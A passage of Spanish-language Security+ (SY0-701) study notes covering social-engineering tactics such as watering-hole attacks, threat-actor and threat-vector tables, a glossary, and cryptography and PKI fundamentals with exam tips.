#### Suplantación de Marca (Brand Impersonation)

- El actor de amenaza duplica con precisión: **logotipos, fuentes, colores, estilos de encabezado** de una empresa
- Imita el **estilo o tono** de las comunicaciones por email o el contenido del sitio web
- Puede intentar que el sitio de phishing **aparezca en los primeros resultados de búsqueda** con contenido realista

#### Desinformación vs. Malinformación

| Término | Definición |
|---|---|
| **Desinformación (Disinformation)** | Motivación **intencional** de engañar; crear y difundir información falsa deliberadamente |
| **Malinformación (Misinformation)** | **Repetir** afirmaciones o rumores falsos **sin intención de engañar** |

**Estrategia:** Una campaña de desinformación puede intentar que otros repitan y amplíen los hechos falsos como malinformación (efecto multiplicador).

**Táctica SEO:** Publicaciones y referencias falsas en redes sociales para aumentar el ranking de búsqueda del sitio falso.

#### Watering Hole Attack (Ataque de Abrevadero)

- **Definición:** El atacante NO va directamente al objetivo; compromete un **sitio de terceros** que el grupo objetivo visita habitualmente
- Proceso:
  1. Actor identifica (por reconocimiento) qué sitio no seguro usan los empleados del objetivo
  2. Compromete ese sitio para ejecutar **código de exploit** en sus visitantes
  3. Infecta las computadoras de los empleados del objetivo
  4. Penetra en los sistemas de la empresa objetivo

**Ejemplo:** Los empleados de una empresa de e-commerce usan una pizzería local online → El actor compromete el sitio de la pizzería → Infecta las computadoras de esos empleados.

> **👉 Enfoque de Examen SY0-701:**
> BEC vs Phishing masivo: la diferencia es el **nivel de personalización y reconocimiento previo**. El BEC es dirigido; el phishing es masivo. Memoriza la jerarquía: Phishing (masivo) → Spear Phishing (dirigido a persona) → Whaling (dirigido a ejecutivo). El Watering Hole es especialmente peligroso porque el objetivo visita un sitio que CONSIDERA seguro. Desinformación = intencional; malinformación = no intencional (el propagador no sabe que es falso). CompTIA distingue estos conceptos en preguntas de escenario.

## 2.4 Tabla Resumen: Tipos de Actores de Amenaza

### 2.4.1 Actores de Amenaza

| Actor | Sofisticación | Recursos | Motivación Principal | Acceso |
|---|---|---|---|---|
| **Script Kiddie** | Baja | Bajos | Notoriedad, curiosidad | Externo |
| **Hacker autorizado** | Alta | Variables | Ético/profesional | Concedido |
| **Hacktivista** | Media | Medios | Política/ideología | Externo |
| **Crimen organizado** | Alta | Altos | Financiera (fraude, extorsión) | Externo |
| **Estado nación / APT** | Muy alta | Muy altos | Espionaje, ventaja estratégica, desinformación | Externo |
| **Insider malicioso** | Variable | Variables | Venganza, financiera | Interno |
| **Insider inadvertido** | N/A | N/A | Accidental (Shadow IT, negligencia) | Interno |
| **Competidor** | Media-Alta | Medios-Altos | Espionaje comercial | Externo |

### 2.4.2 Vectores de Amenaza

| Vector | Tipo | Ejemplo | Contra-medida |
|---|---|---|---|
| Software EOL vulnerable | Técnico | Windows XP sin parches | Aislamiento (control compensatorio) |
| Puerto de red abierto | Red | Puerto `TCP/23` Telnet abierto | Cerrar puertos no necesarios, firewall |
| USB / señuelo físico | Señuelo | Drop attack de USB infectado | Control de ejecución, deshabilitar USB autorun |
| Correo electrónico con adjunto | Mensajes | Adjunto malicioso con factura falsa | Filtrado de email, antivirus, concienciación |
| Phishing / pharming | Humano+Red | Sitio bancario falso | Filtros DNS, MFA, formación de usuarios |
| Cadena de suministro | Organizacional | Ataque tipo SolarWinds | Gestión de adquisiciones, auditoría de proveedores |
| Ingeniería social / BEC | Humano | CEO fraud por email | Formación, verificación por canal alternativo |

## 2.6 Glosario Completo del Tema 02

| Acrónimo / Término | Significado |
|---|---|
| **TTP** | Tactics, Techniques and Procedures — Tácticas, Técnicas y Procedimientos |
| **APT** | Advanced Persistent Threat — Amenaza Persistente Avanzada |
| **DoS** | Denial of Service — Denegación de Servicio |
| **CIA** (tríada) | Confidentiality, Integrity, Availability — Confidencialidad, Integridad, Disponibilidad |
| **EOL / EOS** | End of Life / End of Support — Fin de Vida / Fin de Soporte |
| **MSP** | Managed Service Provider — Proveedor de Servicios Administrados |
| **OEM** | Original Equipment Manufacturer — Fabricante de Equipos Originales |
| **B2B** | Business to Business — De Empresa a Empresa |
| **B2C** | Business to Consumer — De Empresa a Consumidor |
| **BEC** | Business Email Compromise — Compromiso de Correo Electrónico Empresarial |
| **SMS** | Short Message Service — Servicio de Mensajes Cortos |
| **SS7** | Signaling System 7 — Sistema de Señalización 7 |
| **SIM** | Subscriber Identity Module — Módulo de Identidad del Suscriptor |
| **IM** | Instant Messaging — Mensajería Instantánea |
| **VoIP** | Voice over IP — Voz sobre Protocolo de Internet |
| **CSP** | Cloud Service Provider — Proveedor de Servicios en la Nube |
| **Shadow IT** | TI en la sombra — Hardware/software no autorizado por el departamento de TI |
| **Typosquatting** | Allanamiento de error tipográfico — registro de dominios similares a los reales |
| **Pretexting** | Historia elaborada para hacer creíble una suplantación |
| **Pharming** | Redireccionamiento — manipulación de la resolución de nombres DNS |
| **Vishing** | Voice Phishing — Phishing por voz |
| **Smishing** | SMS Phishing — Phishing por SMS |
| **WPAN** | Wireless Personal Area Network — Red inalámbrica de área personal (Bluetooth) |
| **MITRE ATT&CK** | Framework de tácticas y técnicas de adversarios reales |

---

# 3. Algoritmos Criptográficos

La criptografía es el arte de proteger información mediante su transformación matemática. A diferencia de la «seguridad por oscuridad», aunque un atacante sepa dónde está el mensaje, **no puede entenderlo sin la clave correcta**.

## 3.1.1 Conceptos Criptográficos

**Criptografía** = "escritura secreta" → arte de asegurar información **codificándola**.

- **Opuesto** a la *Seguridad a través de la oscuridad* (ocultar el secreto en lugar de cifrarlo).
- Con criptografía: aunque todos conozcan la existencia y ubicación del dato, **sin la clave no pueden entenderlo**.

> **Analogía:** La criptografía es como una caja fuerte de cristal: todos saben que existe y dónde está, pero sin la combinación (clave) nadie puede abrirla. La "seguridad por oscuridad" sería esconder la caja fuerte debajo de una alfombra — eso sí puede descubrirse.

### Terminología fundamental

| Término | Definición |
|---|---|
| **Texto plano / Texto claro** | Mensaje sin cifrar |
| **Texto cifrado** | Mensaje encriptado |
| **Algoritmo** | Proceso utilizado para cifrar y descifrar |
| **Criptoanálisis** | Arte de descifrar sistemas criptográficos |

### Personajes estándar en criptografía (notación académica)

| Personaje | Rol |
|---|---|
| **Alicia (Alice)** | Remitente del mensaje genuino |
| **Bob** | Destinatario previsto |
| **Mallory** | Atacante malicioso que intenta subvertir el mensaje |

### Tres tipos principales de algoritmos criptográficos

```
1. Hash          → Integridad
2. Simétrico     → Confidencialidad
3. Asimétrico    → Confidencialidad + Autenticación + No repudio
```

**Las tres familias de algoritmos criptográficos:**

Existen tres familias o tipos principales de algoritmos criptográficos

```
              ┌───────────────────────────────┐
              │   Algoritmos Criptográficos   │
              └───────────────┬───────────────┘
     ┌────────────────────────┼───────────────────────┐
┌────┴────────┐      ┌────────┴───────┐      ┌────────┴────────┐
│  Simétrico  │      │   Asimétrico   │      │    Hashing      │
│(misma clave)│      │(clave pública/ │      │  (integridad)   │
│             │      │   privada)     │      │                 │
└─────────────┘      └────────────────┘      └─────────────────┘
```


> **👉 Enfoque de Examen SY0-701:** CompTIA pregunta frecuentemente cuál propiedad de seguridad (CIA + no repudio) garantiza cada tipo de algoritmo. **Distractor común:** confundir el hash con cifrado — el hash es **unidireccional** y no cifra, solo verifica integridad. Recuerda que el cifrado **simétrico solo no puede proporcionar autenticación ni no repudio**.

## 3.1.2 Cifrado Simétrico (Symmetric Encryption)

> 🔑 **Analogía:** Imagina una caja con llave donde Alice y Bob tienen la misma llave copiada. El problema: ¿cómo se pasan la copia de la llave sin que Mallory la intercepte?

### Algoritmos base: Sustitución y Transposición

| Técnica | Descripción | Ejemplo |
|---|---|---|
| **Sustitución** | Reemplaza caracteres del texto plano por otros | `ROT13`: A→N, B→O… "Hello World" → "Uryyb Jbeyq" |
| **Transposición** | Las unidades permanecen iguales pero cambia su **orden** | "HELLOWORLD" → columnas → "HLOOLELWRD" |

> Los algoritmos modernos combinan sustitución + transposición en formas complejas para frustrar el criptoanálisis.

### Cómo funciona el cifrado simétrico

```
1. Alice y Bob acuerdan cifrado + valor de clave secreta (compartida)
2. Alice cifra el archivo con la clave
3. Alice envía SOLO el texto cifrado
4. Bob descifra usando la MISMA clave secreta
```

### Ventajas y limitaciones

| Ventaja | Limitación |
|---|---|
| Muy **rápido** | Problema de distribución de la clave |
| Ideal para **cifrado masivo** de grandes volúmenes | Si Mallory intercepta la clave → seguridad comprometida |
| — | **No sirve para autenticación ni integridad** (ambas partes conocen la misma clave) |

> **👉 Enfoque de Examen SY0-701:** Pregunta clásica: "¿Puede el cifrado simétrico proporcionar autenticación?" → **NO**. Ambas partes comparten la misma clave, por lo que cualquiera puede generar el mismo texto cifrado. Distractor: confundir velocidad (simétrico = rápido) con seguridad total.

## 3.1.3 Longitud de la Clave

- **Espacio de claves:** Rango de todos los valores posibles de la clave.
  - Ejemplo ROT13: espacio de claves = 25 (ROT1 a ROT25). ROT0 y ROT26+ = **claves débiles**.
- **Criptoanálisis de fuerza bruta:** Probar cada valor de clave posible hasta encontrar el texto plano.
- La **longitud de la clave** se expresa en bits y determina el tamaño del espacio de claves.

> **Analogía:** La longitud de clave es como el número de dígitos de una combinación. Una cerradura de 3 dígitos (1000 combinaciones) es mucho más fácil de forzar que una de 10 dígitos (10.000.000.000 combinaciones).

### Fórmula del espacio de claves

```
Espacio de claves = 2^(longitud en bits)

AES-128 → 2^128 posibles claves
AES-256 → 2^256 posibles claves
```

> ⚠️ AES-256 NO es el doble de seguro que AES-128 — es **muchos billones de veces más resistente** a fuerza bruta.

### Tabla comparativa de longitudes

| Algoritmo | Longitud de Clave | Espacio de Claves |
|---|---|---|
| `AES-128` | 128 bits | 2¹²⁸ |
| `AES-256` | 256 bits | 2²⁵⁶ |
| `RSA` (aceptable) | 2048 bits | — |
| `ECC` (equivalente a RSA-3072) | 256 bits | — |

**Inconveniente de claves largas:** Mayor consumo de memoria y ciclos de procesador.

> **👉 Enfoque de Examen SY0-701:** CompTIA suele preguntar cuál clave es equivalente en seguridad. Memoriza: **ECC-256 ≈ RSA-3072**. Pregunta trampa: "AES-256 es el doble de seguro que AES-128" → **FALSO**, la diferencia es exponencial, no lineal.

## 3.1.4 Cifrado Asimétrico (Asymmetric Encryption)

> **Analogía:** Es como un buzón con ranura pública y llave privada. Cualquiera puede meter un sobre (cifrar con clave pública), pero solo el dueño del buzón puede sacarlo (descifrar con clave privada).

### Funcionamiento del par de claves

- **Clave pública:** Distribuible libremente. Usada para **cifrar**.
- **Clave privada:** Solo la conoce el propietario. Usada para **descifrar**.
- Las claves son **matemáticamente relacionadas** pero es **computacionalmente imposible** derivar la privada desde la pública.

### Flujo de cifrado asimétrico

```
1. Bob genera par de claves → guarda privada, publica la pública
2. Alice obtiene clave pública de Bob
3. Alice cifra mensaje con clave pública de Bob
4. Alice envía texto cifrado
5. Bob descifra con su clave privada
6. Mallory puede interceptar texto cifrado + clave pública → PERO NO puede descifrar
```

### Comparativa simétrico vs. asimétrico

| Característica | Simétrico | Asimétrico |
|---|---|---|
| Número de claves | 1 (compartida) | 2 (pública + privada) |
| Velocidad | **Rápido** | **Lento** (sobrecarga computacional) |
| Uso principal | Cifrado masivo de datos | Intercambio de claves, autenticación |
| Distribución | Problemática | Fácil (clave pública es pública) |
| Autenticación | No | Sí |

### Algoritmos asimétricos principales

| Algoritmo | Longitud de Clave Mínima Recomendada |
|---|---|
| `RSA` (Rivest, Shamir, Adelman) | **2048 bits** |
| `ECC` (Criptografía de Curva Elíptica) | **256 bits** (equivale a RSA-3072) |

> **Uso híbrido:** El cifrado asimétrico cifra una **clave de sesión simétrica**. La clave simétrica cifra los datos masivos. Esto combina lo mejor de ambos mundos.

> **👉 Enfoque de Examen SY0-701:** Pregunta frecuente: "¿Qué tipo de cifrado se usa para el intercambio de claves?" → **Asimétrico**. "¿Qué tipo se usa para cifrar grandes volúmenes?" → **Simétrico**. Distractor: pensar que el asimétrico "también puede cifrar datos masivos" — técnicamente sí, pero es **ineficiente** y no se usa así en la práctica.

## 3.1.5 Hashing

> **Analogía:** El hash es como la huella dactilar de un archivo. No importa el tamaño del archivo — siempre produce una "huella" de tamaño fijo. Si cambias un solo píxel de una imagen, la huella cambia completamente.

### Características del hashing criptográfico

- Produce una cadena de bits de **longitud fija** desde cualquier entrada de longitud variable.
- También llamado: **hash**, **resumen de mensaje** o **message digest**.
- **Propiedades fundamentales:**
  - **Unidireccional:** Imposible recuperar el texto plano desde el hash.
  - **Sin colisiones:** Entradas diferentes producen salidas diferentes (una colisión = fallo de seguridad).

### Usos del hashing

**Verificación de contraseñas:**
```
1. Bob almacena el hash de la contraseña de Alice
2. Alice escribe contraseña → se convierte en hash → se envía el hash
3. Bob compara hashes → si coinciden, autenticación exitosa
4. Bob NUNCA conoce la contraseña en texto plano
```

**Verificación de integridad de archivos:**
```
1. Alice publica archivo + hash de referencia en su sitio
2. Bob descarga el archivo
3. Bob calcula el hash del archivo descargado
4. Bob compara con el hash de referencia
   → Coincide: archivo íntegro ✅
   → No coincide: archivo manipulado ❌ (Mallory sustituyó el archivo)
```

### Algoritmos de hashing principales

| Algoritmo | Tamaño del Resumen | Seguridad |
|---|---|---|
| `SHA` (Secure Hash Algorithm) | Variable | **Más fuerte** |
| `SHA-256` | 256 bits | **Recomendado** |
| `MD5` (Message Digest Algorithm 5) | 128 bits | **Débil** — solo para compatibilidad |

> **👉 Enfoque de Examen SY0-701:** Pregunta clásica: "¿Qué propiedad garantiza el hashing?" → **Integridad**. Distractor: "¿Puede un hash proporcionar confidencialidad?" → **NO**, es unidireccional pero no cifra. Otra trampa: MD5 sigue siendo válido para *compatibilidad* pero NO para seguridad. SHA-256 es el estándar actual.

## 3.1.6 Firmas Digitales

> **Analogía:** Una firma digital es como una firma notarial que: (1) solo tú puedes hacer con tu propio sello (autenticación), y (2) cualquier cambio en el documento después de firmar lo invalida (integridad).

### Primitivo criptográfico vs. Conjunto de cifrado

- **Primitivo criptográfico:** Una sola función (hash, simétrico o asimétrico) usada de forma aislada.
- **Conjunto de cifrado:** Combinación de múltiples primitivos para formar un sistema completo.

### Cómo funciona una firma digital

```
FIRMA (Alice):
1. Alice calcula el hash del mensaje (ej. SHA-256)
2. Alice firma el hash con su CLAVE PRIVADA (cifrado asimétrico)
3. Alice adjunta la firma digital al mensaje y lo envía a Bob

VERIFICACIÓN (Bob):
3. Bob verifica la firma con la CLAVE PÚBLICA de Alice → obtiene hash original
4. Bob calcula su propio hash del documento recibido
5. Compara los dos hashes:
   → Iguales: datos íntegros + Alice autenticada ✅
   → Diferentes: datos manipulados o firma falsa ❌
```

### Propiedades garantizadas

| Primitivo usado | Propiedad garantizada |
|---|---|
| Hash | **Integridad** |
| Clave privada (firma) | **Autenticación + No repudio** |
| Combinación | **Integridad + Autenticación + No repudio** |

### Estándares de firma digital

| Estándar | Algoritmo base | Notas |
|---|---|---|
| `PKCS#1` | RSA | Estándar de Criptografía de Clave Pública #1 |
| `DSA` (Digital Signature Algorithm) | ElGamal | Parte de FIPS (Normas Federales de EE.UU.) |
| `ECDSA` (Elliptic Curve DSA) | Curva Elíptica | **Más ampliamente usado actualmente** |

> **FIPS:** Normas Federales de Procesamiento de Información del gobierno de EE.UU.

> **👉 Enfoque de Examen SY0-701:** Pregunta frecuente: "¿Qué combina hash + cifrado asimétrico?" → **Firma digital**. Distractor: pensar que la firma digital cifra el mensaje para confidencialidad — **NO**, solo firma el hash para integridad/autenticación. El mensaje en sí puede ir en claro. ECDSA es el más moderno, recuérdalo sobre DSA.

# 3.2 Infraestructura de Clave Pública (PKI)

> **Analogía:** PKI es como el sistema de notarías del mundo digital. Un notario (CA) verifica tu identidad y te emite un documento oficial (certificado digital) que otros pueden consultar para confiar en ti.

**PKI** (Public Key Infrastructure / Infraestructura de Clave Pública): Framework que establece confianza en el uso de criptografía de clave pública mediante **certificados digitales**.

- Un **certificado digital** = afirmación pública de identidad, validada por una **CA** (Autoridad Certificadora / Certificate Authority).

## 3.2.1 Autoridades Certificadoras (CA)

### El problema que resuelve la PKI

> Sin PKI, cualquiera podría publicar una clave pública haciéndose pasar por tu banco. ¿Cómo sabes que la clave pública que recibes es genuina?

- **Clave pública para cifrado:** Cualquiera te envía mensajes que solo tú (con tu clave privada) puedes leer.
- **Clave privada para firma:** Firmas mensajes; otros verifican con tu clave pública.
- **Problema:** No hay mecanismo para probar que el dueño de la clave es quien dice ser → **PKI lo resuelve**.

### Funciones de una CA pública de terceros

- Proveer servicios de certificados útiles a la comunidad.
- **Validar la identidad** de quienes solicitan certificados (registro).
- Establecer confianza con usuarios, gobiernos, reguladores e instituciones.
- Administrar **repositorios** que almacenan y gestionan certificados.
- **Gestión del ciclo de vida**: especialmente la revocación de certificados no válidos.

### Ejemplos de CA de terceros

```
Comodo | DigiCert | GeoTrust | IdenTrust | Let's Encrypt
```

### Flujo PKI completo

```
1. CA genera certificado raíz → lo firma con su clave privada → publica clave pública
2. Cliente obtiene certificado raíz → lo añade a su almacén de certificados de confianza
3. Servidor web crea CSR (Certificate Signing Request) → lo envía a la CA
4. CA genera certificado firmado → lo devuelve al servidor
5. Cliente verifica certificado del servidor → valida firma de CA confiable
6. Se establece conexión cifrada de confianza
```

> **👉 Enfoque de Examen SY0-701:** Pregunta clásica: "¿Qué valida la identidad en una PKI?" → **La CA**. Distractor: confundir el certificado con la clave pública — el certificado **contiene** la clave pública más la identidad validada por la CA.

## 3.2.2 Certificados Digitales

> **Analogía:** Un certificado digital es como un pasaporte: contiene tu foto (clave pública), tus datos personales (información del sujeto), y el sello oficial del gobierno (firma de la CA).

### Componentes de un certificado digital

- **Clave pública del sujeto** (elemento principal)
- Información sobre el **sujeto** (persona u organización)
- Información sobre el **emisor** (la CA)
- **Firma digital** de la CA (prueba de autenticidad)

El sujeto puede ser:
- Un usuario humano (ej. para firmar mensajes de correo)
- Un servidor informático (ej. servidor web con transacciones)

### Estándares de certificados

| Estándar | Organismo | Descripción |
|---|---|---|
| `X.509` | UIT + IETF (RFC 5280) | Estándar base para certificados digitales |
| `PKCS` (Public Key Cryptography Standards) | RSA | Conjunto de estándares para promover el uso de PKI |

> **👉 Enfoque de Examen SY0-701:** Memoriza `X.509` como el estándar de certificados y `RFC 5280` como su referencia IETF. PKCS es el conjunto de estándares de RSA para PKI.

## 3.2.3 Raíz de Confianza

> **Analogía:** La raíz de confianza es como el registro de nacimiento del sistema. Todo parte de ahí. Si la raíz está comprometida, todo el árbol de confianza colapsa.

### Certificado raíz

- Cada CA **se emite un certificado a sí misma** → **certificado autofirmado** → **certificado raíz**.
- Tamaño de clave: `RSA 2048 o 4096 bits` o equivalente `ECC`.
- Sujeto: nombre de la organización/CA (ej. `"CompTIA Root CA"`).
- Instalar el certificado raíz de una CA = **confiar automáticamente en todos los certificados que firme esa CA**.

### Modelos de PKI

#### Modelo 1: CA Única (Single CA)

```
[CA Raíz] ──────────────────→ [Usuarios/Equipos]
```

- Usado en **redes privadas**.
- **Problema:** Si el servidor CA es comprometido → **toda la PKI colapsa**.

#### Modelo 2: CA Jerárquica (Modelo de Terceros)

```
[CA Raíz]
    ↓
[CA Intermedia 1] → [Certificados de hoja/entidad final]
[CA Intermedia 2] → [Certificados de hoja/entidad final]
```

- La CA raíz emite a **CA intermedias**.
- Las CA intermedias emiten a los **sujetos** (hojas / entidades finales).
- **Ventaja:** Diferentes políticas de certificados por CA intermedia.
- Cada certificado de hoja se rastrea hasta la raíz → **encadenamiento de certificados** o **cadena de confianza**.

#### Modelo 3: Certificados Autofirmados (Self-Signed)

- Cualquier equipo, servidor o programa puede implementar un certificado autofirmado.
- Ejemplos de uso: routers domésticos, entornos de desarrollo/prueba.
- El SO o navegador los marca como **no confiables** (el usuario puede anularlo).
- **No deben usarse** para proteger hosts y aplicaciones críticas.

> **👉 Enfoque de Examen SY0-701:** Pregunta frecuente: "¿Qué es la cadena de confianza?" → Ruta de certificación desde el certificado de hoja hasta la CA raíz. Distractor: confundir "certificado autofirmado" con "certificado raíz" — ambos son autofirmados, pero el raíz lo emite una CA oficial mientras que el autofirmado lo emite cualquier entidad sin validación.

## 3.2.4 Solicitudes de Firma de Certificados (CSR)

> **Analogía:** Solicitar un certificado es como solicitar tu DNI: debes presentar tus datos, que el organismo los verifique, y entonces te emiten el documento oficial sellado.

### Proceso de registro y emisión

```
1. Usuario crea cuenta con la CA → obtiene autorización
2. Sujeto genera par de claves (RSA o ECC + longitud elegida)
   → Clave privada: se guarda de forma segura (solo el sujeto la conoce)
3. Sujeto genera CSR (Certificate Signing Request) → contiene su clave pública + info del sujeto
4. CSR se envía a la CA
5. CA verifica:
   → Para servidores web: nombre del sujeto = FQDN (Fully Qualified Domain Name)
   → Verifica que el solicitante es el responsable del dominio (registros WHOIS)
6. CA acepta → firma el certificado → lo devuelve al sujeto
```

**CSR (Certificate Signing Request / Solicitud de Firma de Certificado):** Archivo que contiene la información que el sujeto quiere en el certificado, incluyendo su clave pública.

**FQDN (Fully Qualified Domain Name / Nombre de Dominio Completamente Calificado):** Nombre completo de un host en internet (ej. `www.ejemplo.com`).

> **👉 Enfoque de Examen SY0-701:** Pregunta sobre el proceso: el sujeto **genera su propio par de claves** y envía la CSR con la **clave pública** — nunca envía la privada a la CA. La CA valida la identidad antes de firmar.

## 3.2.5 Atributos del Nombre del Sujeto

### Campo CN (Common Name / Nombre Común)

- Uso original: identificar el **FQDN** del servidor (ej. `www.comptia.org`).
- Actualmente **en desuso** como método primario de validación de identidad.
- Un navegador moderno ignora el CN si existe un campo SAN.

### Campo SAN (Subject Alternative Name / Nombre Alternativo del Sujeto)

- **Estándar actual** para identificar el servidor.
- Puede contener: **FQDN**, **direcciones IP**, **emails**.
- El navegador debe validar el SAN e ignorar el CN.
- Permite que un certificado represente **varios subdominios**.

### Tipos de SAN

| Tipo | Descripción | Ejemplo |
|---|---|---|
| Subdominios específicos | Lista explícita de subdominios | `www.comptia.org`, `members.comptia.org` |
| **Dominio comodín (Wildcard)** | Cubre todos los subdominios de un nivel | `*.comptia.org` → válido para `www.`, `members.`, etc. |
| Email (RFC 822) | Para certificados de correo electrónico | `usuario@empresa.com` |
| Firma de código | Para verificar editores/desarrolladores de software | No usa SAN; la CA valida datos org. |

### Campos del nombre distinguido (DN)

```
CN=www.example.com, OU=Web Hosting, O=Example LLC, L=Chicago, ST=Illinois, C=US
```

| Campo | Significado |
|---|---|
| `CN` | Common Name (Nombre común) |
| `OU` | Organizational Unit (Unidad Organizativa) |
| `O` | Organization (Organización) |
| `L` | Locality (Localidad) |
| `ST` | State (Estado) |
| `C` | Country (País) |

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué campo usa un certificado para identificar múltiples subdominios?" → **SAN**. Trampa: el CN está **en desuso** para validación. Diferencia clave: certificado **comodín** (`*.dominio.com`) vs. certificados de **subdominio específico** — el comodín cubre un nivel, no recursivo.

## 3.2.6 Revocación de Certificados

> **Analogía:** La revocación de un certificado es como cancelar una tarjeta de crédito robada. El banco (CA) avisa a todos los comercios (clientes) que esa tarjeta ya no es válida.

### Estados de un certificado

| Estado | Descripción |
|---|---|
| **Válido** | Certificado activo y confiable |
| **Revocado** | Inválido de forma **permanente** — no puede restaurarse |
| **Suspendido** | Inválido **temporalmente** — puede reactivarse |

### Razones de revocación

- Clave privada comprometida
- Empresa cerrada
- Usuario dejó la empresa
- Nombre de dominio modificado
- Certificado mal utilizado
- Cese de operaciones

### CRL (Certificate Revocation List / Lista de Revocación de Certificados)

- Lista que mantiene la CA con **todos los certificados revocados/suspendidos**.
- Debe ser accesible para cualquier usuario que confíe en la CA.
- Cada certificado contiene info sobre **cómo verificar la CRL**.

**Atributos de una CRL:**

| Atributo | Descripción |
|---|---|
| **Período de publicación** | Fecha/hora de publicación (suele ser automática) |
| **Puntos de distribución** | Ubicaciones donde se publica la CRL |
| **Período de validez** | Tiempo durante el que la CRL es autoritativa (ligeramente mayor al período de publicación) |
| **Firma** | La CRL está firmada por la CA para verificar autenticidad |

**Riesgo de la CRL:** Un certificado puede haber sido revocado pero ser aceptado si no se publicó una CRL actualizada.

### OCSP (Online Certificate Status Protocol / Protocolo de Estado de Certificados en Línea)

- Alternativa más actualizada a la CRL.
- Verifica el **estado individual** de un certificado (no toda la lista).
- Puede consultar la base de datos en **tiempo real** o depender de la CRL.
- Los detalles del servicio OCSP deben publicarse en el certificado.

| Mecanismo | Funciona con | Ventaja | Limitación |
|---|---|---|---|
| **CRL** | Lista descargada | Compatible con todo | Puede quedar desactualizada |
| **OCSP** | Consulta en tiempo real | Más actualizado | Depende del servidor OCSP |

> **👉 Enfoque de Examen SY0-701:** Pregunta: "¿Qué mecanismo proporciona el estado más actualizado de un certificado?" → **OCSP**. Trampa: un certificado revocado puede seguir siendo aceptado si la CRL no se ha actualizado → riesgo de seguridad real. Recuerda que la CRL es descargada periódicamente, no en tiempo real.

## 3.2.7 Gestión de Claves

> **Analogía:** Gestionar claves es como gestionar las llaves físicas de una empresa: hay que crearlas, guardarlas seguras, retirarlas cuando caducan o se pierden, y a veces tener copias de seguridad en una caja fuerte separada.

### Ciclo de vida de una clave

| Etapa | Descripción |
|---|---|
| **Generación** | Crear par de claves asimétricas o clave secreta simétrica con la fuerza requerida |
| **Almacenamiento** | Prevenir acceso no autorizado + proteger contra pérdidas/daños |
| **Revocación** | Prevenir uso si la clave se compromete; datos cifrados deben re-cifrarse con nueva clave |
| **Caducidad y renovación** | Período de validez determinado; renovación con mismo o nuevo par de claves |

### Modelos de gestión de claves

| Modelo | Descripción | Ventaja | Desventaja |
|---|---|---|---|
| **Descentralizado** | Claves generadas/administradas en el propio equipo/cuenta | Fácil de implementar, sin configuración especial | Dificulta detección de compromisos |
| **Centralizado** | Servidor o dispositivo dedicado para generar/almacenar claves | Mejor control y auditoría | Mayor complejidad |

### KMIP (Key Management Interoperability Protocol / Protocolo de Interoperabilidad de Gestión de Claves)

- Protocolo usado para que dispositivos/aplicaciones se comuniquen con el servidor de gestión de claves.

> **👉 Enfoque de Examen SY0-701:** Pregunta: si una clave privada se ve comprometida durante su ciclo de vida, ¿qué debe hacerse? → **Revocar** la clave **Y** re-cifrar todos los datos cifrados con ella usando una nueva clave. KMIP es el protocolo de comunicación en sistemas centralizados.

## 3.2.8 Criptoprocesadores y Enclaves Seguros

> 🔒 **Analogía:** Un criptoprocesador es como una cámara acorazada dentro del banco. Las claves viven ahí, nunca salen, y todo el trabajo criptográfico se hace dentro de la bóveda.

### Problemas del almacenamiento de claves en sistema de archivos

- **Baja entropía:** Los ordenadores son deterministas. Necesitan un PRNG (Pseudo-Random Number Generator / Generador de Números Pseudoaleatorios) para aproximarse a valores aleatorios.
- **Mayor seguridad:** TRNG (True Random Number Generator / Generador de Números Aleatorios Verdaderos) usa fuentes físicas de entropía (ruido, movimiento de aire) como semilla.
- **Vulnerabilidad de almacenamiento:** Una clave en el sistema de archivos es tan segura como cualquier otro archivo → robo físico, credenciales comprometidas.
- **Ideal:** Almacenamiento criptográfico **inviolable (tamper-evident)**.

### TPM (Trusted Platform Module / Módulo de Plataforma Confiable)

Criptoprocesador implementado como **módulo para una plataforma informática específica**.

**Versiones:**
- `TPM 1.2` — Versión antigua, la mayoría de proveedores deja de dar soporte.
- `TPM 2.0` — Versión actual. **No compatible hacia atrás** con 1.2.

**Tipos de implementación TPM:**

| Tipo | Descripción | Resistencia a manipulación | Superficie de ataque |
|---|---|---|---|
| **Discreto (Discrete)** | Chip dedicado independiente | ✅ Alta | 🟢 Mínima |
| **Integrado (Integrated)** | Parte del chipset o CPU | ❌ No resistente | 🟡 Más amplia |
| **Firmware** | En código de bajo nivel (BIOS/UEFI). Ej: Intel PTT, AMD fTPM | ❌ No resistente | 🔴 Más amplia |
| **Virtual** | Implementado en hipervisor para VMs | Depende del hipervisor | Variable |

### HSM (Hardware Security Module / Módulo de Seguridad de Hardware)

Criptoprocesador en **factor de forma removible o dedicado**.

- Formatos: rack, tarjetas `PCIe`, llaves `USB`, dispositivos virtuales.
- **Diferencia con TPM:** El TPM valida una plataforma específica; el **HSM provee almacenamiento centralizado** de claves para hosts de red o almacenamiento portátil.
- Certificación: **FIPS 140-2 Nivel 2** (Federal Information Processing Standard).

### PKCS#11

- **API** (Application Programming Interface / Interfaz de Programación de Aplicaciones) que implementa la comunicación con el criptoprocesador.
- Las aplicaciones acceden a las claves a través de esta interfaz, sin acceso directo al material de clave.

### Enclave Seguro (Secure Enclave / TEE)

**TEE** (Trusted Execution Environment / Entorno de Ejecución Confiable):

- **Problema:** Los datos descifrados deben cargarse en **RAM** para ser procesados → posible acceso por procesos maliciosos.
- **Solución:** Enclave seguro que protege datos en memoria del sistema.
- Ejemplo: `Intel SGX` (Software Guard Extensions / Extensiones de Guardia de Software de Intel).
- **Ni procesos con privilegios root/sistema** pueden acceder sin autorización.
- El enclave está bloqueado a procesos **firmados digitalmente**.

### Resumen comparativo TPM vs. HSM

| Característica | TPM | HSM |
|---|---|---|
| Propósito | Validar plataforma específica | Almacenamiento centralizado/portátil |
| Factor de forma | Chip en placa madre | Rack, PCIe, USB, virtual |
| Portabilidad | No | Sí |
| Alcance | Un dispositivo | Múltiples hosts |

> **👉 Enfoque de Examen SY0-701:** Diferencia clave: **TPM = atado a un dispositivo**, **HSM = centralizado/portátil**. TRNG > PRNG en entropía. FIPS 140-2 es la certificación de seguridad de HSMs. Intel SGX = ejemplo de TEE. Distractor: el TPM Discreto es el más seguro (tamper-resistant); el de Firmware es el más vulnerable.

## 3.2.9 Custodia de Claves

> 🗝️ **Analogía:** La custodia de claves es como la caja de seguridad bancaria que requiere dos llaves simultáneas — la del banco y la del cliente — para abrirse. Ninguno puede acceder solo.

### El problema de las copias de seguridad de claves

- Sin copia de seguridad → si se pierde la clave, los datos **no pueden recuperarse**.
- Con copias → mayor probabilidad de compromiso + dificulta detectar si ya ocurrió.

